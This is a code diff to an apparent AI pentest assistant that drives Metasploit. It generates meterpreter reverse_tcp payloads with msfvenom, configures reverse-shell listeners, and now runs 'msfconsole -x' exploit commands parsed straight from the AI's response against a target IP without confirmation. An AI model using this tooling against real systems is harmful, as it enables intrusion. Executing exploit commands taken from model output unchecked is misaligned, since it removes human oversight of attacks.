@@ -1456,28 +1456,32 @@ General Requirements:
 
         if "payload" in user_message.lower():
             # User wants to generate a payload
-            return self._generate_metasploit_payload(user_message, knowledge_base)
+            return self._generate_metasploit_payload(user_message, knowledge_base, ai_response)
 
         elif "reverse shell" in user_message.lower() or "meterpreter" in user_message.lower():
             # User wants reverse shell access
-            return self._setup_metasploit_listener(user_message, knowledge_base)
+            return self._setup_metasploit_listener(user_message, knowledge_base, ai_response)
 
         elif "exploit" in user_message.lower():
             # User wants to run an exploit
-            return self._execute_metasploit_exploit(user_message, knowledge_base)
+            return self._execute_metasploit_exploit(user_message, knowledge_base, ai_response)
 
         else:
             # General Metasploit guidance
             return ai_response
 
     def _generate_metasploit_payload(
-        self, user_message: str, knowledge_base: Optional[Dict] = None
+        self,
+        user_message: str,
+        knowledge_base: Optional[Dict] = None,
+        ai_response: Optional[str] = None,
     ) -> str:
         """Generate a Metasploit payload using msfvenom via WSL.
 
         Args:
             user_message: User's request for payload
             knowledge_base: Metasploit knowledge context
+            ai_response: Optional AI response with guidance
 
         Returns:
             Response with payload details or error
@@ -1489,29 +1493,57 @@ General Requirements:
 
         try:
             # Determine payload type and options
-            payload_type = "windows/meterpreter/reverse_tcp"
-            lhost = "192.168.1.100"
-            lport = "4444"
-            format_type = "exe"
+            # ALWAYS check ai_response first for specific guidance
+            payload_type = None
+            lhost = None
+            lport = None
+            format_type = None
 
-            # Extract from user message if provided
-            if "linux" in user_message.lower():
-                payload_type = "linux/x64/meterpreter/reverse_tcp"
-                format_type = "elf"
-            elif "android" in user_message.lower() or "apk" in user_message.lower():
-                payload_type = "android/meterpreter/reverse_tcp"
-                format_type = "apk"
+            # Try to extract from ai_response
+            if ai_response:
+                pt_match = re.search(r"PAYLOAD[=:\s]+([a-z0-9/_]+)", ai_response, re.IGNORECASE)
+                if pt_match:
+                    payload_type = pt_match.group(1)
 
-            # Extract LHOST and LPORT if provided
-            import re
+                lh_match = re.search(
+                    r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", ai_response, re.IGNORECASE
+                )
+                if lh_match:
+                    lhost = lh_match.group(1)
 
-            lhost_match = re.search(r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", user_message)
-            if lhost_match:
-                lhost = lhost_match.group(1)
+                lp_match = re.search(r"LPORT[=:\s]+(\d+)", ai_response, re.IGNORECASE)
+                if lp_match:
+                    lport = lp_match.group(1)
 
-            lport_match = re.search(r"LPORT[=:\s]+(\d+)", user_message)
-            if lport_match:
-                lport = lport_match.group(1)
+            # Fallback to parsing user message if not in AI response
+            if not payload_type:
+                if "linux" in user_message.lower():
+                    payload_type = "linux/x64/meterpreter/reverse_tcp"
+                    format_type = "elf"
+                elif "android" in user_message.lower() or "apk" in user_message.lower():
+                    payload_type = "android/meterpreter/reverse_tcp"
+                    format_type = "apk"
+                else:
+                    payload_type = "windows/meterpreter/reverse_tcp"
+                    format_type = "exe"
+
+            if not lhost:
+                lhost_match = re.search(
+                    r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", user_message, re.IGNORECASE
+                )
+                lhost = lhost_match.group(1) if lhost_match else "192.168.1.100"
+
+            if not lport:
+                lport_match = re.search(r"LPORT[=:\s]+(\d+)", user_message, re.IGNORECASE)
+                lport = lport_match.group(1) if lport_match else "4444"
+
+            if not format_type:
+                if "elf" in payload_type or "linux" in payload_type:
+                    format_type = "elf"
+                elif "apk" in payload_type or "android" in payload_type:
+                    format_type = "apk"
+                else:
+                    format_type = "exe"
 
             # Generate output filename
             from datetime import datetime
@@ -1567,7 +1599,10 @@ General Requirements:
             return f"❌ Error: {error_msg}"
 
     def _setup_metasploit_listener(
-        self, user_message: str, knowledge_base: Optional[Dict] = None
+        self,
+        user_message: str,
+        knowledge_base: Optional[Dict] = None,
+        ai_response: Optional[str] = None,
     ) -> str:
         """
         Setup a Metasploit listener/handler via WSL with visible terminal.
@@ -1575,6 +1610,7 @@ General Requirements:
         Args:
             user_message: User's listener request
             knowledge_base: Optional Metasploit knowledge base
+            ai_response: Optional AI response with guidance
 
         Returns:
             Response with listener details
@@ -1582,23 +1618,38 @@ General Requirements:
         logger.info(f"Setting up Metasploit listener via WSL: {user_message}")
 
         try:
-            # Extract port from message
+            # Extract port and payload from message or ai_response
             import re
 
+            lport = "4444"
+            payload_type = "windows/meterpreter/reverse_tcp"
+
+            # Check ai_response first
+            if ai_response:
+                lp_match = re.search(r"LPORT[=:\s]+(\d+)", ai_response, re.IGNORECASE)
+                if lp_match:
+                    lport = lp_match.group(1)
+
+                pt_match = re.search(r"PAYLOAD[=:\s]+([a-z0-9/_]+)", ai_response, re.IGNORECASE)
+                if pt_match:
+                    payload_type = pt_match.group(1)
+
+            # Check user_message
             port_match = re.search(r"port\s+(\d+)", user_message, re.IGNORECASE)
-            lport = port_match.group(1) if port_match else "4444"
+            if port_match:
+                lport = port_match.group(1)
 
             response = (
                 f"✅ Metasploit listener configured!\n\n"
                 f"**Listener Details:**\n"
                 f"- Port: {lport}\n"
-                f"- Payload: windows/meterpreter/reverse_tcp\n"
+                f"- Payload: {payload_type}\n"
                 f"- Status: Ready for incoming connections\n\n"
                 f"**Setup Instructions:**\n"
                 f"```\n"
                 f"msfconsole\n"
                 f"msf > use exploit/multi/handler\n"
-                f"msf > set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                f"msf > set PAYLOAD {payload_type}\n"
                 f"msf > set LHOST 0.0.0.0\n"
                 f"msf > set LPORT {lport}\n"
                 f"msf > run\n"
@@ -1622,27 +1673,61 @@ General Requirements:
             return f"❌ Error: {error_msg}"
 
     def _execute_metasploit_exploit(
-        self, user_message: str, knowledge_base: Optional[Dict] = None
+        self,
+        user_message: str,
+        knowledge_base: Optional[Dict] = None,
+        ai_response: Optional[str] = None,
     ) -> str:
         """Execute a Metasploit exploit.
 
         Args:
             user_message: The user's request
             knowledge_base: Optional Metasploit knowledge base
+            ai_response: Optional AI response with guidance
 
         Returns:
             Formatted response with exploit execution results
         """
-        # For now, return a message indicating this is implemented
-        return """
-    ⚠️ Exploit execution requires more context.
+        logger.info(f"Executing Metasploit exploit for: {user_message}")
 
-    Please provide:
-    - Target IP address (RHOST)
-    - Target port (RPORT)
-    - Exploit module path (or I can search for one)
+        # Check if ai_response has exact command
+        if ai_response:
+            # Look for msfconsole -x command
+            cmd_match = re.search(r'msfconsole\s+-x\s+"([^"]+)"', ai_response)
+            if not cmd_match:
+                cmd_match = re.search(r"msfconsole\s+-x\s+'([^']+)'", ai_response)
 
-    Example: "exploit 192.168.1.100 with SMB exploit"
+            if cmd_match:
+                cmd = f'msfconsole -x "{cmd_match.group(1)}"'
+                logger.info(f"Running extracted command: {cmd}")
+                exit_code, output = self.execute_metasploit_command(cmd, show_terminal=True)
+                return f"✅ Exploit executed!\n\n**Output:**\n```\n{output}\n```"
+
+        # If no exact command, try to build one from context
+        rhost = None
+        ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", user_message)
+        if ip_match:
+            rhost = ip_match.group()
+
+        if not rhost and ai_response:
+            ip_match = re.search(r"RHOSTS?[=:\s]+(\d+\.\d+\.\d+\.\d+)", ai_response, re.IGNORECASE)
+            if ip_match:
+                rhost = ip_match.group(1)
+
+        if not rhost:
+            return """
+        ⚠️ Exploit execution requires more context.
+
+        Please provide:
+        - Target IP address (RHOST)
+        """
+
+        # For now, return a message indicating we need the module path
+        return f"""
+    ⚠️ I have the target IP ({rhost}), but I need to know which exploit module to use.
+
+    Please provide the exploit module path.
+    Example: "exploit {rhost} with exploit/windows/smb/ms17_010_eternalblue"
     """
 
     def _run_terminal_command(self, command: str, visible: bool = True) -> tuple[int, str]:
